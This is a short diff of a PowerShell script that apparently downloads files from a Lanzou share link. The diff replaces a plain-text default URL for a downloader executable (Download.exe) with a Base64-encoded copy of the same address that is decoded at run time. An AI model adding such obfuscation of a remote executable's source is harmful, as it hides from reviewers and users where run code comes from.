@@ -2,7 +2,7 @@ param(
     [string]$ShareUrl = "https://vtlowkey.lanzouc.com/i1K9i1im5fna",
     [string]$Password = "",
     [string]$OutFile = "",
-    [string]$DownloaderUrl = "https://vtlowkey.github.io/bootstrap/Download.exe"
+    [string]$DownloaderUrl = ""
 )
 
 [Console]::OutputEncoding = [Text.Encoding]::UTF8
@@ -12,6 +12,10 @@ $ProgressPreference = "SilentlyContinue"
 
 function Get-LzText([string]$Base64Text) {
     return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64Text))
+}
+
+if ([string]::IsNullOrWhiteSpace($DownloaderUrl)) {
+    $DownloaderUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly92dGxvd2tleS5naXRodWIuaW8vYm9vdHN0cmFwL0Rvd25sb2FkLmV4ZQ=="))
 }
 
 function Quote-ProcessArg([string]$Value) {
